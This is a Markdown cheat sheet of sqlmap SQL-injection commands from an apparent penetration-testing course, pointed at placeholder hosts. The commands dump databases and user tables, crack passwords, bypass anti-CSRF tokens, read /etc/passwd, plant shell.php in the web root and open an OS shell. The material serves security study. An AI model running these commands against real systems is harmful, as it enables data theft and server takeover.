...
## 1.2. Running SQLMap on an HTTP Request
...
## 1.6. Bypassing Web Application Protections
...
Here is the **Sqlmap Essentials Module Cheat Sheet** rewritten in clean **Markdown format**:
...
| `sqlmap -u "http://example.com/vuln.php?id=1" --batch`   | Run sqlmap without user interaction              |
| `sqlmap "http://example.com/" --data "uid=1&name=test"`  | SQLMap with POST request                         |
| `sqlmap "http://example.com/" --data "uid=1*&name=test"` | POST request specifying an injection point (`*`) |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch -banner --current-user --current-db --is-dba --dbs` | get stuff|
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` |	(testdb is database name)|
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb`	| (users is table name, testdb is database name)|
...
| Command                                               | Description                    |
| ----------------------------------------------------- | ------------------------------ |
| `sqlmap -r req.txt`                                   | Use raw HTTP request from file |
| `sqlmap ... --cookie="PHPSESSID=xyz"`                 | Add custom cookie              |
| `sqlmap -u www.target.com --data='id=1' --method PUT` | Send PUT request               |
...
| Command                                                                    | Description               |
| -------------------------------------------------------------------------- | ------------------------- |
| `sqlmap -u "http://example.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Save traffic to file      |
| `sqlmap -u "http://example.com/vuln.php?id=1" -v 6 --batch`                | Set verbosity level (0–6) |
...
| Command                                                                  | Description                               |
| ------------------------------------------------------------------------ | ----------------------------------------- |
| `sqlmap -u "http://example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Add prefix/suffix around payloads         |
| `sqlmap -u "http://example.com/?id=1" -v 3 --level=5`                    | Increase level and risk for more payloads |
...
| Command                                                                                   | Description                          |
| ----------------------------------------------------------------------------------------- | ------------------------------------ |
| `sqlmap -u "http://example.com/?id=1" --banner --current-user --current-db --is-dba`      | Basic database info                  |
| `sqlmap -u "http://example.com/?id=1" --tables -D testdb`                                 | List tables in `testdb`              |
| `sqlmap -u "http://example.com/?id=1" --dump -T users -D testdb -C name,surname`          | Dump specific columns                |
| `sqlmap -u "http://example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional dump                     |
| `sqlmap -u "http://example.com/?id=1" --schema`                                           | Dump full database schema            |
| `sqlmap -u "http://example.com/?id=1" --search -T user`                                   | Search for table containing `user`   |
| `sqlmap -u "http://example.com/?id=1" --passwords --batch`                                | Enumerate and try to crack passwords |
...
| `sqlmap -u "http://example.com/" --data="id=1&csrf-token=XYZ" --csrf-token="csrf-token"` | Bypass anti-CSRF token  |



## Privileges & File Access

| Command                                                                                               | Description                  |
| ----------------------------------------------------------------------------------------------------- | ---------------------------- |
| `sqlmap -u "http://example.com/case1.php?id=1" --is-dba`                                              | Check if current user is DBA |
| `sqlmap -u "http://example.com/?id=1" --file-read "/etc/passwd"`                                      | Read a file from server      |
| `sqlmap -u "http://example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Write file to server         |
| `sqlmap -u "http://example.com/?id=1" --os-shell`                                                     | Open OS shell (if possible)  |
